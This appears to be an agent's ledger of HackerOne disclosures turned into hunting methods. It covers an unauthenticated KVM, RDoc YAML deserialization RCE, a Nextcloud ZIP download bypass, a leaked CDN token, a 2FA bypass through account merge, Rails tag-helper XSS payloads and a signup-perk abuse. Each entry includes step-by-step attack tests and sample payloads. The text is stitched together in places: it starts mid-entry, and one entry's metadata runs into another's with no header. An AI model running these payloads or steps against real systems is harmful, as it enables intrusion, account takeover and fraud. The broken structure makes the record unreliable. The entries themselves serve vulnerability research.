  1. THE SURFACE (report verbatim): a workstation "completely exposed to the internet via IP web interface by way of a TinyPilot KVM device"; the report describes TinyPilot KVMs as hardware devices that let you remotely access computers over IP (product ref in the body: https://tinypilotkvm.com/).
  2. THE ENTRY POINT (report verbatim): "Visiting https://█████ loads into the TinyPilot KVM service with no authentication and connects you to what appears to be a ███████ workstation" — no login form, no session establishment; the KVM's own HTTPS web UI on the device IP IS the whole app.
  3. WHAT ONE VISIT GIVES (report verbatim): "Simply by visiting the IP address in question, anyone on the internet can see the users screen and have full mouse/keyboard control over the workstation. An attacker could also sit and watch the user's screen to gain information."
  4. THE BYPASS: none needed — the defect is MISSING authentication on a device whose function is total host control; the exposure is silent ("There appears to be no notification the user when this happens"). The screen shown is a real user's desktop (report notes an "UNCLASSIFIED" green banner and user initials "SA").
DETECTION SIGNAL: an HTTP(S) service on an in-scope IP whose UI is an IP-KVM console — live video of an attached desktop plus keyboard/mouse passthrough (TinyPilot/PiKVM-class appliances; also vendor IP-KVMs and BMC/iDRAC/iLO/IPMI KVM-over-IP) — reachable with NO login step; the rendered desktop belonging to a DIFFERENT machine than the appliance (domain join, org banners, user initials). 
CHAIN: unauthenticated web access to the KVM (primitive: no auth, no victim interaction — "Simply by visiting the IP address in question") -> live view of the attached workstation's screen (confidentiality, report verbatim: "The user's entire session is exposed. Anything that appears on screen could be seen/watched by an attacker" — cookies/tokens/credentials typed or displayed on screen) -> full mouse/keyboard control (integrity, verbatim: "An attacker could take control of the mouse/keyboard and modify the system in any way") -> keyboard input reaches the OS: open a shell / Run dialog / browser devtools and type commands = RCE on the workstation as its logged-in user (doctrine P1: admin/internal panel access -> RCE; equivalently ATO of whatever session is on screen) -> availability arm (verbatim: "destroy files, inhibit the use of the system, etc."). Per doctrine §8: precondition = network reach to the device IP (no auth, no user interaction); gain = screen monitoring + keyboard/mouse control of the attached workstation (RCE-equivalent).
TRANSFERABLE TEST: on every in-scope IP range: (1) fingerprint internet-facing KVM/BMC consoles (Shodan/Censys title/brand strings for TinyPilot/PiKVM-class devices and IP-KVM/BMC products, then direct HTTP probes); (2) open the web UI and look for ANY login step — if the attached host's desktop renders directly, authentication is missing; (3) prove control with ONE benign input (mouse move / harmless key) with before/after screenshots, then close the connection; (4) write the report at the WORKSTATION's impact level (screen read + input control = RCE/ATO on the host behind the KVM), never as "device exposure". Rule: **a KVM-over-IP web UI is an unattended physical console — no auth on it is full control of whatever machine it clamps onto.**
DEDUPE/DELTA: `2633988`, `socpuppet`, `TinyPilot`, `PiKVM`, `IP-KVM`, `KVM` = 0 hits across the three write targets at read time. Related-but-distinct REVIEWED and NOT re-recorded: the recorded exposed-admin-panel material — Spring Actuator unauth exposure (ledger ~2609 / Bugbountyskills ~20499: a data/management plane, replay-after-reissue angle) and the Icinga/Jenkins monitoring panels behind broken SSO (ledger ~2508, #231460) — all APP-LAYER panels whose impact lives in the application's data; this surface is a hardware video+HID channel to a physical workstation: keyboard input is code execution on the attached OS. NEW DELTA: IP-KVM/KVM-over-IP class as a hunting surface, the "no login at all" test, and the impact framing (RCE-equivalent via keyboard input + live screen read). New general method -> §17.616.
FRESHNESS: disclosed 2024-08-16 — OUTSIDE the preferred 6-12 month window (~15 months); read because assigned. The method (unauthenticated KVM-over-IP = full host control) is device-class-level and re-detectable on any org with remote-management hardware.

Metadata: Ruby, "RCE by parsing `.rdoc_options` in RDoc", reporter `ooooooo_q`, submitted 2021-05-07, disclosed 2024-07-03, weakness Code Injection, resolved. (Reporter `ooooooo_q` also owns the recorded #1198517 / #2303609 / #2542806 entries — different carriers, unrelated.)
STATUS: UNVERIFIED (not reproduced — no `rdoc` run on a crafted tree this pass; every quote below is verbatim from the fetched report body; the PoC is fully quoted and self-contained).
CLASS: insecure deserialization -> RCE (CWE-502) — RDoc's `load_options` runs `YAML.load_file '.rdoc_options'` with no restrictions on restorable classes, so a config dotfile inside a repo received from outside reaches `Kernel.system` via the universal Ruby YAML gadget when `rdoc` runs.
CORE METHOD:
  1. THE SINK (report verbatim, citing https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/rdoc.rb#L165): `def load_options` / `options_file = File.expand_path '.rdoc_options'` / `return RDoc::Options.new unless File.exist? options_file` / `RDoc.load_yaml` / `options = YAML.load_file '.rdoc_options'` — "RCE is possible from Object injection because there are no restrictions on the classes that can be restored."
  2. THE PAYLOAD: a `.rdoc_options` file containing the staaldraad universal Ruby YAML RCE chain (report verbatim: "the yaml attack code is based on this article [Universal RCE with Ruby YAML.load](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/), https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565"): `!ruby/object:Gem::Installer` -> `Gem::SpecFetcher` -> `Gem::Requirement` -> `Gem::Package::TarReader` -> `Net::BufferedIO` -> `Net::WriteAdapter` with `socket: !ruby/module 'Kernel'` / `method_id: :system`, triggered via `method_id: :resolve` (the YAML `&1` reference structure is load-bearing; full YAML quoted in the report).
  3. THE TRIGGER + PROOF (report verbatim): `$ rdoc` in the repo directory -> output "sh: reading: command not found" followed by "uh-oh! RDoc had a problem: no implicit conversion of nil into String" — "Kernel.system is called and `date` is executed."
  4. THE CONSTRAINT (report verbatim): "I also tried building the gem with the `.rdoc_options` file. When running with `gem rdoc`, the file `.rdoc_options` doesn't seem to be read and seems safe. Therefore, it seems that the environment where RCE is actually possible is limited" — the exploitable trigger is `rdoc` run directly (report impact verbatim: "RCE is possible when the `rdoc` command is executed for a repository received from the external"), not `gem rdoc`; a negative under `gem rdoc` is NOT a fix.
DETECTION SIGNAL: any Ruby tool that YAML-loads a config dotfile from the current working tree (`File.exist?` on a relative dotfile beside `YAML.load`/`YAML.load_file` with no `safe_load`/`permitted_classes`); a docs/CI step that runs `rdoc` (or any YAML-config-consuming Ruby tool) over trees that arrived from outside — fetched PRs, cloned third-party repos, uploaded source archives.
CHAIN: attacker contributes/hosts a repository containing `.rdoc_options` (primitive: untrusted repo content — PR, dependency, source archive) -> victim or CI runs `rdoc` on the tree (escalation: the tool parses the attacker's file as YAML with full object construction) -> the universal gadget instantiates `Net::WriteAdapter(Kernel, :system)` during `:resolve` (report verbatim: "Kernel.system is called and `date` is executed") -> command execution as the developer/CI user -> RCE on a dev machine or the CI runner (supply chain; report impact verbatim: "RCE is possible when the `rdoc` command is executed for a repository received from the external"). Per doctrine §8: precondition = the victim runs `rdoc` on attacker-influenced code (no network service, no auth); gain = command execution in the developer/CI context.
TRANSFERABLE TEST: (1) wherever Ruby tooling processes untrusted trees (CI docs jobs, `rdoc` steps, repo-import features), drop the quoted universal gadget into `.rdoc_options` with a benign marker command (`date` / `touch /tmp/rdoc_yaml_pwned`); (2) run `rdoc` and look for the marker plus the double tell (command echo + "uh-oh! RDoc had a problem"); (3) audit sibling config sinks — the same chain works at every unrestricted `YAML.load*` on a tree-local config; (4) test the trigger exactly as the tool is invoked: `rdoc` directly vs `gem rdoc`. Rule: **an unrestricted YAML load of a config file inside the processed tree is deserialization RCE — the config file IS the payload and the universal Gem/Net::WriteAdapter chain is the key.**
DEDUPE/DELTA: `.rdoc_options`, `staaldraad`, `Gem::SpecFetcher`, `Gem::Package::TarReader`, `RDoc::Options`, `Net::BufferedIO` = 0 hits across the three write targets at read time (`rdoc` 3 hits = unrelated: the renderer-CONFIG detection signal "Hugo/RDoc/Jekyll/Pandoc front-matter", ledger ~2348 / Bugbountyskills ~20309, and the `.rdoc` extension probe, ledger ~4946). Related-but-distinct REVIEWED and NOT re-recorded: ledger ~2143 / Bugbountyskills ~20110 — the SAME universal Ruby gadget classes (`Net::WriteAdapter`/`Gem::Requirement` -> `Kernel#system`, "devcraft.io universal Ruby deserialization gadget") but as a MARSHAL payload injected into a Redis session via a length-prefix desync; the gadget FAMILY is owned there — this entry's delta is the YAML `!ruby/object:` form of the chain, the tree-local config-dotfile SINK class, and the trigger constraint; Liberapay #2467232 "Unsafe yaml load" (ledger ~12406, Python `yaml.load`) was judged a generic best-practice note and not appended; the PHP POP-chain entry (ledger ~15125) and §17.151 (Jint->Newtonsoft `TypeNameHandling`) are other-language counterparts. NEW DELTA: unrestricted `YAML.load_file` on tool-config dotfiles as a proven RCE sink (`.rdoc_options` carrier), the paste-ready universal YAML gadget, and `rdoc` vs `gem rdoc`. New general method -> §17.617.
FRESHNESS: submitted 2021-05-07 / disclosed 2024-07-03 — OUTSIDE the preferred 6-12 month window (~28 months since disclosure); read because assigned. The method (unrestricted Ruby YAML load on tree-local config -> universal gadget RCE) is language-API-level and re-detectable on every Ruby tooling surface.

SOURCE: https://hackerone.com/reports/2247457  2026-11-12
ROUTE: live `https://hackerone.com/reports/2247457.json` = HTTP 200, `visibility: full`, `vulnerability_information` 372 chars read IN FULL. Metadata: Nextcloud, "Can download files by zipping the folder", reporter `nickvergessen` (Joas Schilling), submitted 2023-11-10, disclosed 2024-02-17, weakness Improper Access Control - Generic, resolved. The team summary links the credited advisory GHSA-vhj3-mch4-67fq — OPENED this pass: "Can download 'view-only' files with the Files ZIP app", CVE-2024-22404, CWE-284, patched in Files ZIP app 1.2.1 / 1.4.1 / 1.5.0, credited reporter nickvergessen.
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance was stood up this pass; every quote below is verbatim from the fetched report body or the credited advisory).
CLASS: BAC / share-permission bypass (CWE-284) — a share's "view-only" / hide-download restriction is enforced on the per-file fetch path but NOT inside the server-side ZIP-generation operation (Nextcloud "Files ZIP" app): the aggregate archive generator reads with READ permission and serves the very bytes the DOWNLOAD permission denies.
CORE METHOD:
  1. Owner side (report step 1, verbatim): "Create folder and share it as view-only" — the share grants read but denies download (report step 5: "The folder itself can not be downloaded directly"; Impact: "Can download files without download permissions").
  2. Recipient side (report step 2): "Access this folder with Testuser" — an ordinary second account accepts the share.
  3. THE BYPASS (report step 3, verbatim): "Go one level up and compress the whole folder" — from the PARENT directory, invoke the Files ZIP compress/archive action ON the shared folder; the server-side zip generation packages the folder's contents.
  4. THE RESULT (report step 4, verbatim): "The zip file can be downloaded and extracted locally" — the full file bytes leave through the archive although every individual file is download-restricted.
  5. THE GAP (advisory Impact, verbatim): "Users can download 'view-only' files by zipping the complete folder." — the per-item download flag is never re-checked inside the ZIP generator.
DETECTION SIGNAL: any share/restriction mode that leaves a READ grant but removes the DOWNLOAD/export grant ("hide download", "view-only", no-export, watermarked preview) coexisting with an aggregate-artifact generator over the same tree (compress/"download as zip"/"download folder", export-all, print-to-PDF, batch download); the tell pair: the item-level fetch answers DENIAL while the archive action answers with a container carrying the item bytes; the generator is often reachable only from the PARENT directory or a bulk-selection view, never from inside the restricted folder.
CHAIN: owner shares a folder view-only with download disabled (primitive: read-grant + download-deny) -> recipient reaches the Files ZIP generation action from the parent directory (bypass: the archive generator reads with read-perm and never consults the per-item download flag) -> the generated zip delivers every restricted file's bytes (impact: confidentiality breach of deliberately no-download content — report Impact verbatim: "Can download files without download permissions"). Per doctrine §8: precondition = an ordinary valid share recipient (no admin, no interaction beyond accepting the share); gain = full byte content of files the owner deliberately marked non-downloadable. Escalation to TEST on other targets: where the restricted content is sensitive (contracts, medical/financial documents, unwatermarked media sold per-view), the bypass converts a view-only access model into full extraction — the same chain reaches P2 on such content.
TRANSFERABLE TEST: on every file-share/content platform with a "hide download"/view-only/no-export mode: (1) accept the share as a second user and confirm the item-level download is refused; (2) enumerate every aggregate-artifact action over the same tree — "compress"/"download as zip"/"download folder"/"export all"/"print to PDF", including parent-directory and bulk-selection views; (3) run it and unzip/export locally — restricted bytes inside the artifact = the flag is enforced only on the direct fetch path. Rule: **a restriction checked on the item-fetch path must be re-checked by every derived-artifact generator — the zip/export endpoint is a second download path, usually one directory level away.**
DEDUPE/DELTA: `2247457`, `nickvergessen`, `GHSA-vhj3-mch4-67fq`, `CVE-2024-22404`, `Files ZIP` = 0 hits as a download-bypass across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.448 (Monero — a restricted/view-only MODE enforced ad hoc per RPC handler; its differential is denial-string-vs-success across a METHOD surface; this entry's gap is a share ACL vs ONE aggregate generator and the test is the parent-level compress action, not method enumeration); ledger ~2598/2600 (export/download/archive surfaces diffed against the UI ACL — that entry hunts exports leaking HIDDEN FIELDS/attachments of records you CAN view; this is download-restricted CONTENT whose BYTES escape via the archive); the Slack in-app PDF-viewer entry (#881557) is a render-side stored XSS, unrelated. NEW DELTA: the view-only share -> server-side ZIP-generation download bypass as a class, the "one level up" positioning of the compress action, and the rule that derived-artifact generators must re-check per-item download flags. New general method -> §17.618.
FRESHNESS: submitted 2023-11-10 / disclosed 2024-02-17 — OUTSIDE the preferred 6-12 month window (~21 months); read because assigned. The method (permission gap on derived-artifact generation) is app-feature-level and re-detectable on every share/export surface.

SOURCE: https://hackerone.com/reports/2184872  2026-11-12
ROUTE: researcher body withheld on every route — live `.json` = HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 chars; the HuggingFace parquet row present with VI 0; `web_extract` + the live page = team summary + timeline only; `r.jina.ai` = 401; Wayback capture 20240313132519 = JS shell carrying the same og:description; the ajaysenr mirror = metadata + "No vulnerability information available."; no credited public writeup exists (searched — index rows only). ROUTE THAT WORKED for the method: the public TEAM SUMMARY in the live `.json` `summaries[]`, quoted verbatim below. Metadata: Rockstar Games, "Exposed CDN access token allows modification of all newly uploaded Snapmatic photos", reporter `bugstar`, submitted 2023-09-27, disclosed 2024-01-26, weakness Improper Access Control - Generic, Medium — CVSS 5.3, asset prod.ros.rockstargames.com, resolved.
STATUS: UNVERIFIED (not reproduced — no request shape is public and none is invented; every quote below is verbatim from the team summary or the report title).
CLASS: BAC / unauthorized content write via response-side credential overshare (CWE-284 / CWE-200) — the upload/publish response carries CDN fields including an access token that stays valid "for a brief interval" after the upload and grants WRITE over newly uploaded media; the report title carries the cross-user scope: modification of ALL newly uploaded Snapmatic photos, not only the caller's own object.
CORE METHOD (everything the public summary states — nothing beyond it):
  1. THE LEAK CHANNEL (summary verbatim): "the researcher reported an exposure of CDN access token" — the fix sentence locates it: "This issue has been resolved by removing CDN fields from the response", i.e. the API response to the upload flow returned CDN credentials/fields.
  2. THE CAPABILITY (summary verbatim): "allows an attacker to modify newly uploaded photo in GTA5 Snapmatics"; the title extends the scope: "modification of ALL newly uploaded Snapmatic photos" (cross-user).
  3. THE WINDOW (summary verbatim): "The access token retained validity for a brief interval subsequent to the upload process, thereby providing a window of opportunity for content modification."
  4. THE FIX PATTERN (verbatim): "removing CDN fields from the response" — a response must never carry write-capable CDN credentials at all.
  (No endpoint path, token format or request body is public on any route.)
DETECTION SIGNAL: any upload/publish/mutation response that returns CDN/storage fields (access token, signature, bucket/path, upload URL) instead of only the object's public reference; a token whose validity extends past the request ("brief interval subsequent to the upload"); a write scope covering NEWLY uploaded content generally rather than the object just uploaded (sequential/predictable keys, per-epoch tokens).
CHAIN: attacker performs their own upload and reads the CDN fields out of the RESPONSE (primitive: a write-capable CDN access token disclosed to any uploading user) -> the token stays valid after the upload (primitive: temporal over-validity) -> during the window it writes to newly uploaded media — per the title, ALL newly uploaded Snapmatics, i.e. other users' fresh uploads (escalation: cross-user content modification) -> demonstrated impact = integrity of user media at scale (program rating: Medium, CVSS 5.3). Per doctrine §8: precondition = an ordinary account able to upload + knowledge of another upload's object path within the window; gain = overwrite/modify other users' newly uploaded content.
TRANSFERABLE TEST: on every CDN-backed user-content upload flow: (1) diff the upload/publish RESPONSE for CDN/storage fields (token, signature, URL, path) — the fix pattern "remove CDN fields from the response" is the checklist; (2) if a token appears, use it to PUT/overwrite the object you just uploaded (proof of write), then a DIFFERENT user's object uploaded within the validity window (derive the path from sequential keys or the public URL); (3) map the window by replaying the token after N minutes. Rule: **audit what the upload response RETURNS, not just what the upload ACCEPTS — a CDN write token in the response is a cross-user content-modification primitive for as long as it stays valid.**
DEDUPE/DELTA: `2184872`, `bugstar`, `Snapmatic`, `CDN access token`, `CDN field` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the recorded presigned/signed-URL family — ownCloud PreSignedURL expiry-short-circuit auth bypass (ledger ~6688; validator logic, not response leakage), the aws-iam-authenticator STS presigned replay (ledger ~5589), #93691 presigned-POST policy prefix limits — none records a write-capable CDN credential returned IN the upload response with temporal + cross-user scope; the secret-scanning family (#761791 "leaked third-party SaaS credential -> vendor panel access", #3017105, §9.5) is about tokens committed to repos, not tokens served by the API to the caller. Metadata: LinkedIn, "bypass two-factor authentication.", reporter `spaceboy20`, submitted 2023-01-20, disclosed 2023-08-01, weakness Improper Authentication - Generic, severity Medium (4.8), resolved, bounty paid.
STATUS: UNVERIFIED (not reproduced — no merge flow was driven this pass and the researcher body is withheld; every quote below is verbatim from the team summary; the steps beyond it are transparently derived and labelled).
CLASS: authentication bypass / 2FA bypass — the ACCOUNT-MERGE feature is an alternate login surface: with the victim's password known, it completes access to the victim account WITHOUT the second-factor challenge the normal login enforces.
CORE METHOD (everything the public summary states — nothing beyond it):
  1. THE PRECONDITION (summary verbatim): "provided the credential of victim is known" — the attacker holds the victim's password (first factor only, no 2FA device).
  2. THE BYPASS SURFACE (summary verbatim): "using the merge-accounts feature" — an account-merge / identity-combine flow (settings screen or API), NOT the login form.
  3. THE RESULT (summary verbatim): "which allowed to log in the victim account without any 2 FA control" — the flow grants access to (or absorbs) the victim account with the second factor never satisfied.
  4. (No endpoint path, request shape or parameter is public on any route — nothing invented.)
DETECTION SIGNAL: an account-merge / combine-duplicates / identity-transfer feature (settings or API: `mergeAccounts`, "merge your accounts", "combine accounts", account-claim/move flows) coexisting with a login that DOES enforce 2FA; the tell pair: the merge authenticates the second account with password only, and afterwards the victim account (or its data/identity) is reachable from the attacker's session.
CHAIN: attacker holds the victim's password (primitive: first-factor credential — leaked/reused/stolen) -> drives the merge-accounts feature instead of the login form (escalation: alternate auth path with no second-factor gate) -> gains access to the victim account "without any 2 FA control" (impact: ATO of any 2FA-protected account whose password is known; program rating Medium 4.8). Per doctrine §8: precondition = victim password known (no victim interaction beyond that); gain = victim-account access with 2FA never satisfied.
TRANSFERABLE TEST: on every app with an account-merge / combine / identity-transfer feature: create account A with 2FA ON and attacker account B; while authenticated as B (and again unauthenticated), drive the merge flow with A's email+password and watch whether a 2FA code for A is requested AND enforced; if the merge completes on password alone and A's account/data becomes reachable from B (or a session as A is issued), 2FA is bypassed. Repeat on "link/combine duplicate account", "move data to another account", "claim existing account" flows. Rule: **the merge/identity-transfer flow is a second login surface — if it accepts the password without the second factor, the 2FA on the login form is theatre.**
DEDUPE/DELTA: `1842183`, `spaceboy20`, `merge-accounts`, `mergeAccounts` = 0 hits as a technique across the three write targets (the single `mergeAccounts` hit, Bugbountyskills.md:17394, is a recon-table row for an unrelated app's endpoint, tested-clean on a redirect param). Related-but-distinct REVIEWED and NOT re-recorded: the japz HackerOne embedded-submission entry (batch 8 — a sibling ROUTE performing a restricted ACTION while the guard hangs on the primary controller; this is the LOGIN second-factor gate itself, skipped on an identity-merge flow); §17.285 (Shopify BOLA on account-LINKING — a missing ownership check on the provider-connect endpoint, a different defect); §17.171 / #665722 (MFA factor NAMED by a client request field on the verify call); the Algolia TOTP-seed re-send entry (the seed leaks so codes can be minted); the Pulse Secure chain (2FA bypass via stolen Duo keys/cookie forgery after file read). NEW DELTA: the account-MERGE feature as a 2FA-less login surface, with the "victim creds known -> merge -> access" chain and its test. New general method -> §17.620.
FRESHNESS: disclosed 2023-08-01 — OUTSIDE the preferred 6-12 month window (~27 months); read because assigned. The method (identity flows as alternate login surfaces) is feature-class-level and re-detectable on every app with account merging.

SOURCE: https://hackerone.com/reports/1444151  2026-11-12
ROUTE: live `https://hackerone.com/reports/1444151.json` = HTTP 200, `visibility: full`, `vulnerability_information` 4,645 chars read IN FULL. Metadata: Ruby on Rails (asset https://github.com/rails/rails), "XSS vulnerabilities due to missing checks in tag helpers", reporter `amartinfraguas`, submitted 2022-01-08, disclosed 2023-07-28, weakness Cross-site Scripting (XSS) - Generic, severity medium, resolved (the report is a fix proposal with tests/changelogs for the Rails repo).
STATUS: UNVERIFIED (not reproduced — no Rails app was stood up this pass; every quote below is verbatim from the fetched report body).
CLASS: XSS via NAME-context injection in framework tag builders (CWE-79) — ActionView::Helpers::FormTagHelper and TagHelper build tags from an options HASH whose KEYS are HTML attribute names, and accept the TAG NAME as an argument; when user input reaches a key or the tag-name argument it breaks out of the tag, because "their current protection does not restrict properly the set of characters allowed in the names of tag attributes and in the names of tags" (report verbatim) — the helpers' own name filtering is the broken defence.
CORE METHOD:
  1. THE SINK GROUP 1 — the `options` argument of FormTagHelper methods (`check_box_tag, label_tag, radio_button_tag, select_tag, submit_tag, text_area_tag, text_field_tag, etc.`), three cases (report verbatim): "When providing prefixed HTML 'data-*' attributes" / "aria-* attributes" / "a hash of other types of non-boolean attributes".
  2. THE CALL SHAPE (report verbatim): `check_box_tag('thename', 'thevalue', false, data: { malicious_input => 'thevalueofdata' })` — "when the variable `malicious_input` is controlled in part or completely by a user of the application, an attacker can provide an input that will break free from the tag and execute arbitrary JavaScript code"; identical for `aria: { malicious_input => 'thevalueofaria' }` and bare `malicious_input => 'theothervalue'`.
  3. THE REFLECTED POC (report verbatim): view `<%= check_box_tag('thename', 'thevalue', false, data: { params[:payload] => 'thevalueofdata' }) %>` + request `http://...?payload=something="something"><img src="/nonexistent" onerror="alert(1)"><div class` — the NAME position breaks out of the tag; "For some applications, that code can be executed in the browser of a different user visiting the application... some applications are probably using more dangerous stored user input instead of URL parameters, allowing attackers to perform stored XSS attacks on other users."
  4. THE SINK GROUP 2 — `tag` and `content_tag` with a user-controlled TAG NAME (report verbatim): `tag(malicious_input)`, `tag.public_send(malicious_input.to_sym)`, `content_tag(malicious_input)` with payload `img%20src=%22/nonexistent%22%20onerror=%22javascript_payload%22` (percent-encoded spaces/quotes in the tag-name argument).
  5. The same options-hash sink exists in every listed method ("label_tag, radio_button_tag, select_tag, submit_tag, text_area_tag, text_field_tag..."); the fix is upstream in the helpers (a fix proposal with tests was submitted with the report), so the test below also discriminates patched vs unpatched Rails versions — and the NAME-context rule transfers to any other tag builder that splats user input into attributes (Jinja `**attrs`, Django attrs dicts, JS frameworks rendering attribute objects).
DETECTION SIGNAL: any Rails view/helper where an options-hash KEY (`data: { x => ... }`, `aria: { x => ... }`, `{ x => value }`) or the tag-name argument of `tag`/`content_tag`/`*_tag` derives from user input (params, DB, API field); black-box tell: user input reflected into an attribute NAME — the rendered attribute's NAME changes with the input; a payload of `a="b"><img src=/nonexistent onerror=...><x class` in that position yields a NEW element in the response HTML.
CHAIN: attacker's input reaches a tag-helper name context (primitive: name-position injection — key or tag-name argument) -> quote/angle break-out escapes the tag despite helper escaping (the helper restricts names only partially) -> arbitrary JavaScript in the application origin (impact: XSS; where the input is STORED, every viewer executes it — report verbatim: "steal passwords or other private information from the user, substitute parts of the website with fake content" -> session theft -> ATO). Per doctrine §8: precondition = user-influenced input in a name context (reflected: victim opens a crafted URL; stored: any viewer of the content); gain = JS execution in the victim's origin.
TRANSFERABLE TEST: (1) source route: grep Rails views/helpers for `data: {`, `aria: {`, `tag(`, `content_tag(` where the KEY or first argument is a variable/param, and feed it `x="><img src=/nonexistent onerror=alert(1)><b class`; (2) black-box: on any endpoint whose input lands in an attribute name (form/widget/tag builders), send `a="b"><img src=/nonexistent onerror=alert(1)><x class` and diff the rendered HTML for a NEW element; (3) confirm with the report's two exact payload shapes (the `?payload=` reflected param and the percent-encoded tag-name form `img%20src=%22/nonexistent%22%20onerror=%22javascript_payload%22`); (4) a clean render = patched helper — move to the app's own custom tag builders, which often skip the (patched) framework path entirely. Rule: **helper escaping defends the VALUE context — a user-controlled attribute NAME or TAG NAME is a markup context of its own and breaks out of the tag; test names, not just values.**
DEDUPE/DELTA: `1444151`, `amartinfraguas`, `check_box_tag`, `content_tag`, `FormTagHelper`, `TagHelper`, `tag helpers` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the recorded attribute-injection entries are VALUE/CONTENT-position carriers — GitLab Kroki `lang`-mismatch value into a string-concatenated `<img>` (ledger ~2549), the `filename*=ASCII-8BIT''…` quote-break in `href` plus ReferenceRedactor `data-original` re-emit (ledger ~2453/2463), and the autolinker `_`/`@` bogus-tag trick (#299728) — each injects markup from a VALUE or text breakout in one app sink; this entry's delta is the NAME context (hash keys / tag-name argument) of framework tag BUILDERS, where the framework's own name sanitization is the broken defence and the same bug class spans every `*_tag` call in every Rails app. NEW DELTA: name-position XSS in tag builders (attribute-name keys / tag-name args). New general method -> §17.621.
FRESHNESS: submitted 2022-01-08 / disclosed 2023-07-28 — OUTSIDE the preferred 6-12 month window (~28 months); read because assigned; the report's fixes landed upstream in Rails (the report is a fix proposal), so exploitability is version-dependent on Rails itself — the name-context test remains valid for unpatched apps and for custom tag builders outside the patched helpers.

SOURCE: https://hackerone.com/reports/1296584  2026-11-12
ROUTE: live `https://hackerone.com/reports/1296584.json` = HTTP 200, `visibility: full`, `vulnerability_information` 594 chars read IN FULL. Metadata: Glovo, "Getting a free delivery by singing up from \"admin_@glovoapp.com\"", reporter `cmuppin`, submitted 2021-08-09, disclosed 2022-07-11, weakness Privilege Escalation, severity medium, asset *.glovoapp.com, resolved.
STATUS: UNVERIFIED (not reproduced — no account was created at Glovo this pass; every quote below is verbatim from the fetched report body).
CLASS: business-logic privilege escalation (monetary impact) — an employee/staff perk is granted by EMAIL-ADDRESS PATTERN MATCH at signup with no proof of mailbox/domain ownership: registering `admin_@glovoapp.com` awards the "FREE delivery Glovo Team ∞" perk.
CORE METHOD:
  1. THE GRANT CONDITION (report verbatim): "Getting a free delivery for food by just signing up from \"admin_@glovoapp.com\"" — the perk keys on the email STRING matching an internal-staff pattern (the `@glovoapp.com` suffix and/or the `admin_` prefix), not on verified ownership of the mailbox or domain.
  2. THE PROOF (report verbatim): the account shows "the \" FREE delivery Glovo Team\n∞\" in profile section"; the CONTROL account on "regular email-id \"toweli5706@6ekk.com\"" placing "a order with same location... didn't got any free delivery option".
  3. THE STEPS (report verbatim): "1) Signup as \"admin_@glovoapp.com\" 2) Select any city 3) Place a order." — no email-verification or domain-check step is described at any point.
  4. THE SCALE (report verbatim): "Anybody can signup by using a @glovoapp.com, so they can easily get free delivery for food and extra privilege."
DETECTION SIGNAL: a signup/registration flow that grants staff/beta/internal perks (free delivery, discounts, employee badge, admin flags, feature unlocks) keyed to the email address matching an internal pattern (company-domain suffix, role prefix `admin_`/`staff`/`hr`) with no mailbox/domain verification; the tell: a freshly registered account displaying an employee/team badge ("... Team") or perk in its profile that a normal account does not get.
CHAIN: attacker signs up with an unverified internal-looking address (primitive: the perk check reads the email STRING only) -> the fresh account carries the employee perk ("FREE delivery Glovo Team ∞") (escalation: privilege escalation to the staff tier) -> every order placed with it gets free delivery (impact: monetary loss per order, unlimited accounts — report verbatim: "they can easily get free delivery for food and extra privilege"; program rating: medium, weakness Privilege Escalation). Per doctrine §8: precondition = open signup with no mailbox verification; gain = employee perk = free delivery = real monetary impact per order at scale.
TRANSFERABLE TEST: on every app with staff/employee/internal perks keyed to email: (1) enumerate the grant condition from UI copy ("@company.com", "Team", "employee") or by diffing a staff account's profile flags; (2) register with an address matching the pattern that you do NOT own (`admin_@company.com`, `test@company.com`, plus `+tag` and dot-variants) and skip or delay any verification; (3) diff the fresh account's perks/flags/prices against a normal account at the same step (profile badge, delivery/fee line, beta features); (4) if verification IS enforced, test whether the perk is granted BEFORE verification completes and whether it survives an expired/never-completed verification. Rule: **an email address is a claim, not a credential — a perk keyed on the address pattern without mailbox/domain verification is privilege escalation by string match.**
DEDUPE/DELTA: `1296584`, `cmuppin`, `glovo`, `free delivery`, `admin_@`, `Glovo Team` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.173 (an ownership CHECK whose second factor is the shared email-DOMAIN constant — an order-lookup IDOR; different defect: weak identifier check, not a perk GRANT); the OAuth unverified-email -> cross-site ATO family (ledger ~4693/4704 — identity folding into a victim account; its chain side-note "internal-only pages gated by an email domain suffix" is post-login page gating, not a signup perk); the B2B "claim your company" org-claim entry (ledger ~6656 — org role via public identifier + checkbox, not email-pattern perks); the lookalike-internal-address registration chain (ledger ~10473 — intercepting mail for support@company.com, an address-registration trick, not a perk grant). NEW DELTA: perk/privilege GRANT keyed on the email-address PATTERN at signup with no mailbox-ownership verification, with the control-account diff as proof. New general method -> §17.622.
FRESHNESS: submitted 2021-08-09 / disclosed 2022-07-11 — OUTSIDE the preferred 6-12 month window (~4 years); read because assigned; the class (pattern-matched perk grants at signup) is feature-level and re-detectable on any signup surface with employee/beta perks.
